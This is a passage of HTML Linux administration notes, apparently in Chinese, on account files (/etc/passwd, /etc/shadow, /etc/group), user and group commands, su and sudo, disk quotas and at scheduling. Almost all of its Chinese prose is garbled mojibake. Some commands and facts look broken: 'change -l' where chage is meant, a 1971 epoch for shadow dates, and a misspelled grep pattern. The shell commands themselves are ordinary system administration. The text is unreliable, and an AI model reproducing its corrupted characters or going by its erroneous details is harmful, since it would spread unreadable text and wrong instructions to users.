UID), ä¸€ä¸ªæ˜¯ç”¨æˆ·ç»„ ID (Group ID, GID).</p><h3 id="13-1-2-ç”¨æˆ·è´¦å·"><a href="#13-1-2-ç”¨æˆ·è´¦å·" class="headerlink" title="13.1.2 ç”¨æˆ·è´¦å·"></a>13.1.2 ç”¨æˆ·è´¦å·</h3><p>è¾“å…¥è´¦å·å’Œå¯†ç åï¼Œç³»ç»Ÿçš„å¤„ç†:</p><ol><li>å…ˆæŸ¥æ‰¾ <code>/etc/passwd</code> é‡Œé¢æ˜¯å¦æœ‰ä½ è¾“å…¥çš„è´¦å·ï¼Œå¦‚æœæœ‰ï¼Œåˆ™å°†è´¦å·å¯¹åº”çš„ UID å’Œ GID (åœ¨ <code>/etc/group</code> ä¸­) è¯»å‡º, å¹¶å°†å®¶ç›®å½•ä¸ Shell è®¾ç½®ä¹Ÿè¯»å‡º.</li><li>å†æ¥æ ¸å¯¹å¯†ç è¡¨ã€‚è¿™æ—¶ Linux ä¼šè¿›å…¥ <code>/etc/shadow</code> é‡Œé¢æ‰¾å‡ºå¯¹åº”çš„è´¦å·ä¸ UID.</li><li>å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™è¿›å…¥ shell ç®¡ç†é˜¶æ®µã€‚</li></ol><p>å¯¹ <code>/etc/passwd</code> å’Œ <code>/etc/shadow</code> çš„è¯¦ç»†è¯´æ˜å¯è§ <code>man 5 passwd</code> å’Œ <code>man 5 shadow</code>.</p><h4 id="etc-passwd-æ–‡ä»¶ç»“æ„"><a href="#etc-passwd-æ–‡ä»¶ç»“æ„" class="headerlink" title="/etc/passwd æ–‡ä»¶ç»“æ„"></a><code>/etc/passwd</code> æ–‡ä»¶ç»“æ„</h4><p>æœ‰ä¸ƒéƒ¨åˆ†å†…å®¹ï¼Œç”¨ <code>:</code> éš”å¼€:</p><ol><li>è´¦å·åç§°</li><li>å¯†ç </li><li>UID</li><li>GID</li><li>ç”¨æˆ·ä¿¡æ¯è¯´æ˜æ </li><li>å®¶ç›®å½•, å½“è´¦æˆ·ç™»å½•æ—¶å°±ä¼šè¿›å…¥çš„ç›®å½•</li><li>shell</li></ol><h4 id="etc-shadow-æ–‡ä»¶ç»“æ„"><a href="#etc-shadow-æ–‡ä»¶ç»“æ„" class="headerlink" title="/etc/shadow æ–‡ä»¶ç»“æ„"></a><code>/etc/shadow</code> æ–‡ä»¶ç»“æ„</h4><p>åŒæ ·ä»¥ <code>:</code> åˆ†éš”ï¼Œå…±æœ‰ä¹ä¸ªå­—æ®µ:</p><ol><li>è´¦æˆ·åç§°</li><li>å¯†ç </li><li>æœ€è¿‘ä¿®æ”¹å¯†ç çš„æ—¥æœŸ, å…¶è®¡ç®—çš„å¤©æ•°ä» 1971-1-1 å¼€å§‹</li><li>å¯†ç ä¸å¯è¢«ä¿®æ”¹çš„å¤©æ•°</li><li>å¯†ç éœ€è¦é‡æ–°ä¿®æ”¹çš„å¤©æ•°</li><li>å¯†ç éœ€è¦ä¿®æ”¹æœŸé™å‰çš„è­¦å‘Šå¤©æ•°</li><li>å¯†ç è¿‡æœŸåçš„è´¦å·å®½é™æ—¶é—´</li><li>è´¦å·å¤±æ•ˆæ—¥æœŸ</li><li>ä¿ç•™</li></ol><p>root å¯†ç å¿˜è®°çš„è§£å†³åŠæ³•:</p><ul><li>é‡æ–°å¯åŠ¨åè¿›å…¥å•äººç»´æŠ¤æ¨¡å¼</li><li>ä»¥ Live CD å¯åŠ¨åæŒ‚è½½æ ¹ç›®å½•å»ä¿®æ”¹ <code>/etc/shadow</code></li></ul><p>æŸ¥çœ‹ shadow æ˜¯ä½¿ç”¨å“ªç§åŠ å¯†çš„æœºåˆ¶:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">authconfig --<span class="hljs-built_in">test</span> |grep hasing</span><br></code></pre></td></tr></table></figure><h3 id="13-1-3-å…³äºç”¨æˆ·ç»„-æœ‰æ•ˆä¸åˆå§‹ç”¨æˆ·ç»„-groups-newgr"><a href="#13-1-3-å…³äºç”¨æˆ·ç»„-æœ‰æ•ˆä¸åˆå§‹ç”¨æˆ·ç»„-groups-newgr" class="headerlink" title="13.1.3 å…³äºç”¨æˆ·ç»„: æœ‰æ•ˆä¸åˆå§‹ç”¨æˆ·ç»„, groups, newgr"></a>13.1.3 å…³äºç”¨æˆ·ç»„: æœ‰æ•ˆä¸åˆå§‹ç”¨æˆ·ç»„, groups, newgr</h3><p>ä¸¤ä¸ªæ–‡ä»¶ <code>/etc/group</code> å’Œ <code>/etc/gshadow</code>.</p><h4 id="etc-group-æ–‡ä»¶ç»“æ„"><a href="#etc-group-æ–‡ä»¶ç»“æ„" class="headerlink" title="/etc/group æ–‡ä»¶ç»“æ„"></a><code>/etc/group</code> æ–‡ä»¶ç»“æ„</h4><ol><li>ç»„å</li><li>ç”¨æˆ·ç»„å¯†ç </li><li>GID</li><li>æ­¤ç”¨æˆ·ç»„ä¸»æŒçš„è´¦å·åç§°</li></ol><h4 id="æœ‰æ•ˆç”¨æˆ·ç»„-effective-group-å’Œåˆå§‹ç”¨æˆ·ç»„-initial-group"><a href="#æœ‰æ•ˆç”¨æˆ·ç»„-effective-group-å’Œåˆå§‹ç”¨æˆ·ç»„-initial-group" class="headerlink" title="æœ‰æ•ˆç”¨æˆ·ç»„ (effective group) å’Œåˆå§‹ç”¨æˆ·ç»„ (initial group)"></a>æœ‰æ•ˆç”¨æˆ·ç»„ (effective group) å’Œåˆå§‹ç”¨æˆ·ç»„ (initial group)</h4><p>åˆå§‹ç”¨æˆ·ç»„ (<code>/etc/passwd</code> ä¸­çš„ç¬¬4å­—æ®µ) åœ¨ç”¨æˆ·ä¸€ç™»å½•å°±ä¼šä¸»åŠ¨è·å–ï¼Œä¸éœ€è¦åœ¨ <code>/etc/group</code> çš„ç¬¬å››ä¸ªå­—æ®µå†…å†™å…¥è¯¥è´¦å·ã€‚</p><p>é€šå¸¸æœ‰æ•ˆç”¨æˆ·ç»„çš„ä½œç”¨å°±æ˜¯æ–°å»ºæ–‡ä»¶, ä¸€ä¸ªè´¦å·æ–°å»ºçš„æ–‡ä»¶ï¼Œå…¶æ‰€å±ç”¨æˆ·ç»„ä¸ºæœ‰æ•ˆç”¨æˆ·ç»„.</p><p>é€šè¿‡ <code>groups</code> å‘½ä»¤æŸ¥çœ‹ï¼Œç¬¬ä¸€ä¸ªè¾“å‡ºå³ä¸ºæœ‰æ•ˆç”¨æˆ·ç»„ï¼Œåé¢çš„ä¸ºç”¨æˆ·æ‰€å±çš„å…¶ä»–ç”¨æˆ·ç»„.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">groups</span></span><br></code></pre></td></tr></table></figure><h4 id="newgrp-æœ‰æ•ˆç”¨æˆ·ç»„çš„åˆ‡æ¢"><a href="#newgrp-æœ‰æ•ˆç”¨æˆ·ç»„çš„åˆ‡æ¢" class="headerlink" title="newgrp: æœ‰æ•ˆç”¨æˆ·ç»„çš„åˆ‡æ¢"></a>newgrp: æœ‰æ•ˆç”¨æˆ·ç»„çš„åˆ‡æ¢</h4><p>ä½ æƒ³è¦åˆ‡æ¢çš„ç”¨æˆ·ç»„å¿…é¡»æ˜¯ä½ å·²ç»æœ‰æ”¯æŒçš„ç”¨æˆ·ç»„ã€‚</p><p>è¿™ä¸ªå‘½ä»¤å¯ä»¥ä¿®æ”¹ç›®å‰ç”¨æˆ·çš„æœ‰æ•ˆç”¨æˆ·ç»„ï¼Œè€Œä¸”ä½¿ç”¨å¦ä¸€ä¸ª shell æä¾›æ­¤åŠŸèƒ½ã€‚ç”¨æˆ·çš„ç¯å¢ƒè®¾ç½®ä¸ä¼šæœ‰å½±å“ï¼Œä½†æ˜¯å…¶ç”¨æˆ·ç»„æƒé™ä¼šé‡æ–°è®¡ç®—ã€‚</p><h4 id="etc-gshadow-æ–‡ä»¶ç»“æ„"><a href="#etc-gshadow-æ–‡ä»¶ç»“æ„" class="headerlink" title="/etc/gshadow æ–‡ä»¶ç»“æ„"></a><code>/etc/gshadow</code> æ–‡ä»¶ç»“æ„</h4><ol><li>ç»„å</li><li>å¯†ç æ </li><li>ç”¨æˆ·ç»„ç®¡ç†å‘˜è´¦å·</li><li>æœ‰åŠ å…¥è¯¥ç”¨æˆ·ç»„æ”¯æŒçš„æ‰€å±è´¦å·<br>gshadow çš„æœ€å¤§åŠŸèƒ½æ˜¯å»ºç«‹ç”¨æˆ·ç»„ç®¡ç†å‘˜ã€‚</li></ol><h2 id="13-2-è´¦å·ç®¡ç†"><a href="#13-2-è´¦å·ç®¡ç†" class="headerlink" title="13.2 è´¦å·ç®¡ç†"></a>13.2 è´¦å·ç®¡ç†</h2><h3 id="13-2-1-æ–°å¢ä¸åˆ é™¤ç”¨æˆ·-useradd-ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œpasswd-usermod-userdel"><a href="#13-2-1-æ–°å¢ä¸åˆ é™¤ç”¨æˆ·-useradd-ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œpasswd-usermod-userdel" class="headerlink" title="13.2.1 æ–°å¢ä¸åˆ é™¤ç”¨æˆ·: useradd, ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œpasswd, usermod, userdel"></a>13.2.1 æ–°å¢ä¸åˆ é™¤ç”¨æˆ·: useradd, ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œpasswd, usermod, userdel</h3><h4 id="useradd-å‚è€ƒæ–‡ä»¶"><a href="#useradd-å‚è€ƒæ–‡ä»¶" class="headerlink" title="useradd å‚è€ƒæ–‡ä»¶"></a>useradd å‚è€ƒæ–‡ä»¶</h4><p>useradd çš„é»˜è®¤å€¼æŸ¥çœ‹:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># useradd -D</span><br></code></pre></td></tr></table></figure><p>å…¶å†…å®¹ä½äº <code>/etc/default/useradd</code></p><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># passwd</span><br></code></pre></td></tr></table></figure><p>åé¢ä¸æ¥è´¦å·å°±æ˜¯ä¿®æ”¹è‡ªå·±çš„å¯†ç ã€‚</p><p>åˆ©ç”¨ standard input å»ºç«‹ç”¨æˆ·çš„å¯†ç :</p><h4 id="change"><a href="#change" class="headerlink" title="change"></a>change</h4><p>æ˜¾ç¤ºçº¤ç»†çš„å¯†ç å‚æ•°:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># change -l è´¦å·å</span><br></code></pre></td></tr></table></figure><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>å¯¹è´¦å·è®¾ç½®è¿›è¡Œè°ƒæ•´.</p><h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p>åˆ é™¤ç”¨æˆ·çš„ç›¸å…³æ•°æ®ã€‚</p><h3 id="13-2-2-ç”¨æˆ·åŠŸèƒ½"><a href="#13-2-2-ç”¨æˆ·åŠŸèƒ½" class="headerlink" title="13.2.2 ç”¨æˆ·åŠŸèƒ½"></a>13.2.2 ç”¨æˆ·åŠŸèƒ½</h3><h4 id="chsh"><a href="#chsh" class="headerlink" title="chsh"></a>chsh</h4><p>change shell çš„ç®€å†™ã€‚<br>é€‰é¡¹åŠå‚æ•°:</p><ul><li><code>-l</code>, åˆ—å‡ºç›®å‰ç³»ç»Ÿä¸Šå¯ç”¨çš„ shell</li><li><code>-s</code>, è®¾ç½®ä¿®æ”¹è‡ªå·±çš„ shell<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;abc543cc&quot;</span> | passwd --stdin vbird2</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="13-4-ç”¨æˆ·èº«ä»½åˆ‡æ¢"><a href="#13-4-ç”¨æˆ·èº«ä»½åˆ‡æ¢" class="headerlink" title="13.4 ç”¨æˆ·èº«ä»½åˆ‡æ¢"></a>13.4 ç”¨æˆ·èº«ä»½åˆ‡æ¢</h2><h3 id="13-4-1-su"><a href="#13-4-1-su" class="headerlink" title="13.4.1 su"></a>13.4.1 su</h3><p>å•çº¯ä½¿ç”¨ <code>su -</code> ä»£è¡¨ä½¿ç”¨ <code>login-shell</code> çš„å˜é‡æ–‡ä»¶è¯»å–æ–¹å¼ç™»å½•ç³»ç»Ÿ, è‹¥ä½¿ç”¨è€…åç§°æ²¡æœ‰åŠ ä¸Šå», åˆ™ä»£è¡¨åˆ‡æ¢ä¸º root çš„èº«ä»½.</p><p>è‹¥è¦å®Œæ•´åœ°åˆ‡æ¢åˆ°æ–°ç”¨æˆ·çš„ç¯å¢ƒ, å¿…é¡»è¦ä½¿ç”¨ <code>su - username</code> æˆ– <code>su -l username</code>, æ‰ä¼šè¿åŒ PATH, USER, MAIL ç­‰å˜é‡éƒ½è½¬æ¢æˆæ–°ç”¨æˆ·çš„ç¯å¢ƒ.</p><h3 id="13-4-2-sudo"><a href="#13-4-2-sudo" class="headerlink" title="13.4.2 sudo"></a>13.4.2 sudo</h3><p>ä»…æœ‰ <code>/etc/sudoers</code> æ–‡ä»¶ä¸‹çš„ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ <code>sudo</code>.</p><h1 id="ç¬¬14ç« -ç£ç›˜é…é¢-Quota-ä¸é«˜çº§æ–‡ä»¶ç³»ç»Ÿç®¡ç†"><a href="#ç¬¬14ç« -ç£ç›˜é…é¢-Quota-ä¸é«˜çº§æ–‡ä»¶ç³»ç»Ÿç®¡ç†" class="headerlink" title="ç¬¬14ç«  ç£ç›˜é…é¢ (Quota) ä¸é«˜çº§æ–‡ä»¶ç³»ç»Ÿç®¡ç†"></a>ç¬¬14ç«  ç£ç›˜é…é¢ (Quota) ä¸é«˜çº§æ–‡ä»¶ç³»ç»Ÿç®¡ç†</h1><h2 id="14-1-ç£ç›˜é…é¢-Quota-çš„åº”ç”¨ä¸å®è·µ"><a href="#14-1-ç£ç›˜é…é¢-Quota-çš„åº”ç”¨ä¸å®è·µ" class="headerlink" title="14.1 ç£ç›˜é…é¢ (Quota) çš„åº”ç”¨ä¸å®è·µ"></a>14.1 ç£ç›˜é…é¢ (Quota) çš„åº”ç”¨ä¸å®è·µ</h2><p>Quota ç”¨äºé™åˆ¶ç”¨æˆ·å¯¹ç£ç›˜çš„ä½¿ç”¨å®¹é‡.</p><h3 id="14-1-1-ä»€ä¹ˆæ˜¯ç£ç›˜é…é¢"><a href="#14-1-1-ä»€ä¹ˆæ˜¯ç£ç›˜é…é¢" class="headerlink" title="14.1.1 ä»€ä¹ˆæ˜¯ç£ç›˜é…é¢"></a>14.1.1 ä»€ä¹ˆæ˜¯ç£ç›˜é…é¢</h3><h4 id="ç£ç›˜é…é¢çš„ä¸€èˆ¬ç”¨é€”"><a href="#ç£ç›˜é…é¢çš„ä¸€èˆ¬ç”¨é€”" class="headerlink" title="ç£ç›˜é…é¢çš„ä¸€èˆ¬ç”¨é€”"></a>ç£ç›˜é…é¢çš„ä¸€èˆ¬ç”¨é€”</h4><ul><li>é’ˆå¯¹ç½‘ç«™æœåŠ¡å™¨</li><li>é’ˆå¯¹é‚®ä»¶æœåŠ¡å™¨</li><li>é’ˆå¯¹æ–‡ä»¶æœåŠ¡å™¨</li><li>é™åˆ¶æŸä¸€ç”¨æˆ·ç»„æ‰€èƒ½ä½¿ç”¨çš„æœ€å¤§ç£ç›˜é…é¢</li><li>é™åˆ¶æŸä¸€ç”¨æˆ·æ‰€èƒ½ä½¿ç”¨çš„æœ€å¤§ç£ç›˜é…é¢</li><li>é™åˆ¶æŸä¸€ç›®å½• (directory) çš„æœ€å¤§ç£ç›˜é…é¢</li></ul><p><code>du</code> å‘½ä»¤ä¼šè®¡ç®—ç›®å½•çš„ç£ç›˜ä½¿ç”¨ç‡.</p><h4 id="ç£ç›˜é…é¢çš„ä½¿ç”¨é™åˆ¶"><a href="#ç£ç›˜é…é¢çš„ä½¿ç”¨é™åˆ¶" class="headerlink" title="ç£ç›˜é…é¢çš„ä½¿ç”¨é™åˆ¶"></a>ç£ç›˜é…é¢çš„ä½¿ç”¨é™åˆ¶</h4><ul><li>ext æ–‡ä»¶ç³»ç»Ÿä»…èƒ½é’ˆå¯¹æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿ, xfs å¯ä»¥ä½¿ç”¨ project æ¨¡å¼æ¥è®¾è®¡ä¸åŒç›®å½•çš„ç£ç›˜é…é¢</li><li>å†…æ ¸å¿…é¡»æ”¯æŒç£ç›˜é…é¢</li><li>åªå¯¹ä¸€èˆ¬èº«ä»½ç”¨æˆ·æœ‰æ•ˆ</li><li>è‹¥å¯ç”¨ SELinux, éæ‰€æœ‰ç›®å½•å‡å¯è®¾ç½®ç£ç›˜é…é¢, å…¶ä¼šåŠ å¼ºæŸäº›ç‰¹æ®Šçš„æƒé™æ§åˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ä»…èƒ½é’ˆå¯¹ &#x2F;home è¿›è¡Œè®¾ç½®</li></ul><p>ç£ç›˜é…é¢å¯ä»¥ç®¡ç† block å’Œ inode, é™åˆ¶ inode çš„ä½¿ç”¨é‡å³ç®¡ç†ç”¨æˆ·å¯ä»¥å»ºç«‹çš„æ–‡ä»¶æ•°é‡.</p><p>hard å’Œ soft é™åˆ¶:</p><ul><li>hard, ä¸èƒ½è¶…è¿‡</li><li>soft, æœ‰ grace time<br>hard å€¼ä¸€èˆ¬é«˜äº soft å€¼ã€‚ é»˜è®¤çš„ soft å€¼ä¸º 7 å¤©.</li></ul><h3 id="14-1-2-ä¸€ä¸ª-xfs-æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜é…é¢å®è·µèŒƒä¾‹"><a href="#14-1-2-ä¸€ä¸ª-xfs-æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜é…é¢å®è·µèŒƒä¾‹" class="headerlink" title="14.1.2 ä¸€ä¸ª xfs æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜é…é¢å®è·µèŒƒä¾‹"></a>14.1.2 ä¸€ä¸ª xfs æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜é…é¢å®è·µèŒƒä¾‹</h3><h3 id="14-1-3-å®è·µç£ç›˜é…é¢æµç¨‹-1-ï¼šæ–‡ä»¶ç³»ç»Ÿçš„æ”¯æŒä¸æŸ¥çœ‹"><a href="#14-1-3-å®è·µç£ç›˜é…é¢æµç¨‹-1-ï¼šæ–‡ä»¶ç³»ç»Ÿçš„æ”¯æŒä¸æŸ¥çœ‹" class="headerlink" title="14.1.3 å®è·µç£ç›˜é…é¢æµç¨‹ -1 ï¼šæ–‡ä»¶ç³»ç»Ÿçš„æ”¯æŒä¸æŸ¥çœ‹"></a>14.1.3 å®è·µç£ç›˜é…é¢æµç¨‹ -1 ï¼šæ–‡ä»¶ç³»ç»Ÿçš„æ”¯æŒä¸æŸ¥çœ‹</h3><p>ä¸è¦åœ¨æ ¹ç›®å½•ä¸‹è¿›è¡Œç£ç›˜é…é¢è®¾ç½®.</p><h1 id="ç¬¬15ç« -è®¡åˆ’ä»»åŠ¡-crontab"><a href="#ç¬¬15ç« -è®¡åˆ’ä»»åŠ¡-crontab" class="headerlink" title="ç¬¬15ç«  è®¡åˆ’ä»»åŠ¡(crontab)"></a>ç¬¬15ç«  è®¡åˆ’ä»»åŠ¡(crontab)</h1><h2 id="15-1-ä»€ä¹ˆæ˜¯è®¡åˆ’ä»»åŠ¡"><a href="#15-1-ä»€ä¹ˆæ˜¯è®¡åˆ’ä»»åŠ¡" class="headerlink" title="15.1 ä»€ä¹ˆæ˜¯è®¡åˆ’ä»»åŠ¡"></a>15.1 ä»€ä¹ˆæ˜¯è®¡åˆ’ä»»åŠ¡</h2><h3 id="15-1-1-Linux-è®¡åˆ’ä»»åŠ¡çš„ç§ç±»-at-cron"><a href="#15-1-1-Linux-è®¡åˆ’ä»»åŠ¡çš„ç§ç±»-at-cron" class="headerlink" title="15.1.1 Linux è®¡åˆ’ä»»åŠ¡çš„ç§ç±»: at, cron"></a>15.1.1 Linux è®¡åˆ’ä»»åŠ¡çš„ç§ç±»: at, cron</h3><ul><li>at, å¤„ç†ä»…æ‰§è¡Œä¸€æ¬¡å°±ç»“æŸçš„ä»»åŠ¡ï¼Œå³çªå‘æ€§ä»»åŠ¡, éœ€ atd æœåŠ¡</li><li>cron, æ‰€è®¾ç½®çš„ä»»åŠ¡ä¼šå¾ªç¯çš„æ‰§è¡Œï¼Œå³ä¾‹è¡Œä»»åŠ¡ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´å°±æ‰§è¡Œï¼Œéœ€ crond æœåŠ¡</li></ul><h2 id="15-2-ä»…æ‰§è¡Œä¸€æ¬¡çš„è®¡åˆ’ä»»åŠ¡"><a href="#15-2-ä»…æ‰§è¡Œä¸€æ¬¡çš„è®¡åˆ’ä»»åŠ¡" class="headerlink" title="15.2 ä»…æ‰§è¡Œä¸€æ¬¡çš„è®¡åˆ’ä»»åŠ¡"></a>15.2 ä»…æ‰§è¡Œä¸€æ¬¡çš„è®¡åˆ’ä»»åŠ¡</h2><h3 id="15-2-1-atd-çš„å¯åŠ¨å’Œ-at-çš„è¿è¡Œæ–¹å¼"><a href="#15-2-1-atd-çš„å¯åŠ¨å’Œ-at-çš„è¿è¡Œæ–¹å¼" class="headerlink" title="15.2.1 atd çš„å¯åŠ¨å’Œ at çš„è¿è¡Œæ–¹å¼"></a>15.2.1 atd çš„å¯åŠ¨å’Œ at çš„è¿è¡Œæ–¹å¼</h3><p>åœ¨ Ubuntu ä¸‹å®‰è£… atd æœåŠ¡:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span><span class="hljs-built_in">at</span><br></code></pre></td></tr></table></figure><p>æ‰‹åŠ¨å¯åŠ¨:</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo <span class="hljs-params">system</span>ctl restart atd<br>sudo <span class="hljs-params">system</span>ctl enable atd<br>sudo <span class="hljs-params">system</span>ctl status atd<br></code></pre></td></tr></table></figure><h4 id="at-çš„è¿è¡Œæ–¹å¼"><a href="#at-çš„è¿è¡Œæ–¹å¼" class="headerlink" title="at çš„è¿è¡Œæ–¹å¼"></a>at çš„è¿è¡Œæ–¹å¼</h4><p>ä½¿ç”¨ <code>at</code> å‘½ä»¤æ¥äº§ç”Ÿæ‰€è¦è¿è¡Œçš„ä»»åŠ¡ï¼Œå¹¶ä»¥æ–‡æœ¬æ–‡ä»¶çš„æ–¹å¼å†™å…¥ <code>/var/spool/at</code> ç›®å½•å†…ç­‰å¾… atd æœåŠ¡çš„æ‰§è¡Œã€‚</p><p>å¯ä»¥åˆ©ç”¨ <code>/etc/at.allow</code> å’Œ <code>/etc/at.deny</code> ä¸¤ä¸ªæ–‡ä»¶å®ç°å¯¹ at çš„é™åˆ¶ã€‚</p><p>æ·»åŠ åçš„å·¥ä½œæƒ…å†µä¸º:</p><ol><li>å…ˆæ‰¾å¯» <code>/etc/at.allow</code> æ–‡ä»¶ï¼Œå†™åœ¨è¿™ä¸ªæ–‡ä»¶çš„ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ at</li><li>å¦‚æœ <code>/etc/at.allow</code> æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™æ‰¾å¯» <code>/etc/at.deny</code> æ–‡ä»¶ï¼Œå†™åœ¨ <code>/etc/at.deny</code> ä¸­çš„ç”¨æˆ·ä¸èƒ½ä½¿ç”¨ at</li><li>å¦‚æœä¸¤ä¸ªæ–‡ä»¶éƒ½ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆåªæœ‰ root ç”¨æˆ·å¯ä»¥ä½¿ç”¨ at å‘½ä»¤</li></ol><p>ä¸å¸Œæœ›æŸäº›ç”¨æˆ·ä½¿ç”¨ atï¼Œå°±å°†é‚£ä¸ªç”¨æˆ·çš„è´¦å·å†™å…¥ <code>/etc/at.deny</code>, ä¸€ä¸ªè´¦å·å†™ä¸€è¡Œã€‚</p><h3 id="15-2-2-å®é™…è¿è¡Œå•ä¸€è®¡åˆ’ä»»åŠ¡"><a href="#15-2-2-å®é™…è¿è¡Œå•ä¸€è®¡åˆ’ä»»åŠ¡" class="headerlink" title="15.2.2 å®é™…è¿è¡Œå•ä¸€è®¡åˆ’ä»»åŠ¡"></a>15.2.2 å®é™…è¿è¡Œå•ä¸€è®¡åˆ’ä»»åŠ¡</h3><p>ä½¿ç”¨:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">at <span class="hljs-selector-attr">[-mldv]</span> <span class="hljs-selector-tag">TIME</span><br></code></pre></td></tr></table></figure><p>at å‘½ä»¤çš„é€‰é¡¹å’Œå‚æ•°:</p><ul><li>-m : åº”è¯¥æ˜¯ mail, å½“ at çš„ä»»åŠ¡å®Œæˆåï¼Œå³ä¾¿æ²¡æœ‰è¾“å‡ºä¿¡æ¯ï¼Œä¹Ÿä¼šå‘é€ email é€šçŸ¥</li><li>-l : åº”è¯¥æ˜¯ list, <code>at -l</code> ç›¸å½“äº <code>atq</code>, åˆ—å‡ºç›®å‰ç³»ç»Ÿä¸Šæ‰€æœ‰è¯¥ä½¿ç”¨è€…çš„ at è®¡åˆ’</li><li>-d : åº”è¯¥æ˜¯ delete, <code>at -d</code> ç›¸å½“äº <code>atrm</code>, å¯ä»¥å–æ¶ˆä¸€ä¸ªåœ¨ <code>at</code> è®¡åˆ’ä¸­çš„ä»»åŠ¡</li><li>-c : åº”è¯¥æ˜¯ code, å¯ä»¥åˆ—å‡ºåé¢æ¥çš„è¯¥é¡¹ä»»åŠ¡çš„å®é™…å‘½ä»¤å†…å®¹</li></ul><p>æœ€é‡è¦çš„æ˜¯ <code>TIME</code> å‚æ•°, å…¶æ ¼å¼ä¸º:</p><ul><li>HH:MM</li><li>HH:MM YYYY-MM-DD</li><li>HH:MM[am|pm] [Mouth] [Date]</li><li>HH:MM[am|pm] + number [minutes|hours|days|weeks]<br>å¯ä»¥æœ‰ <code>now + ...</code> æ–¹å¼ã€‚</li></ul><p>ä½¿ç”¨ at æ—¶ä¼šè¿›å…¥ at shell çš„ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥å‘½ä»¤æœ€å¥½ç”¨ç»å¯¹è·¯å¾„ã€‚</p><p>at çš„æ‰§è¡Œå’Œç»ˆç«¯ç¯å¢ƒæ— å…³ï¼Œå¦‚æœè¦æ˜¾ç¤º Hello:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;Hello&quot;</span> &gt; <span class="hljs-regexp">/dev/</span>tty1<br></code></pre></td></tr></table></figure><p>å³é€šè¿‡ç»ˆç«¯è®¾å¤‡å¤„ç†.</p><p>ç”±äº at è®¡åˆ’ä»»åŠ¡çš„ä½¿ç”¨ï¼Œç³»ç»Ÿä¼šå°†è¯¥é¡¹ at ä»»åŠ¡ç‹¬ç«‹å‡ºä½ çš„ bash ç¯å¢ƒï¼Œç›´æ¥äº¤ç»™ç³»ç»Ÿçš„ atd ç¨‹åºæ¥æ¥ç®¡ã€‚</p><h4 id="at-ä»»åŠ¡çš„ç®¡ç†"><a href="#at-ä»»åŠ¡çš„ç®¡ç†" class="headerlink" title="at ä»»åŠ¡çš„ç®¡ç†"></a>at ä»»åŠ¡çš„ç®¡ç†</h4><p>ä½¿ç”¨ <code>atq</code> æŸ¥è¯¢ï¼Œ<code>atrm</code> åˆ é™¤ã€‚</p><h4 id="batch-ç³»ç»Ÿæœ‰ç©ºæ—¶æ‰æ‰§è¡Œåå°ä»»åŠ¡"><a href="#batch-ç³»ç»Ÿæœ‰ç©ºæ—¶æ‰æ‰§è¡Œåå°ä»»åŠ¡" class="headerlink" title="batch: ç³»ç»Ÿæœ‰ç©ºæ—¶æ‰æ‰§è¡Œåå°ä»»åŠ¡"></a>batch: ç³»ç»Ÿæœ‰ç©ºæ—¶æ‰æ‰§è¡Œåå°ä»»åŠ¡</h4><p>batch å‘½ä»¤ä¹Ÿæ˜¯è°ƒç”¨ at æ¥æ‰§è¡Œã€‚</p><p>å®ƒæ˜¯åœ¨ CPU ä»»åŠ¡è´Ÿè½½å°äº 0.8 æ—¶æ‰æ‰§è¡Œä½ çš„ä»»åŠ¡ã€‚</p><p>ä»»åŠ¡è´Ÿè½½ï¼Œå³ CPU åœ¨å•ä¸€æ—¶é—´ç‚¹æ‰€è´Ÿè´£çš„ä»»åŠ¡æ•°é‡, è€Œä¸æ˜¯ CPU çš„ä½¿ç”¨ç‡ã€‚</p><p>CPU çš„ä»»åŠ¡è´Ÿè½½å¤§ï¼Œä»£è¡¨ CPU 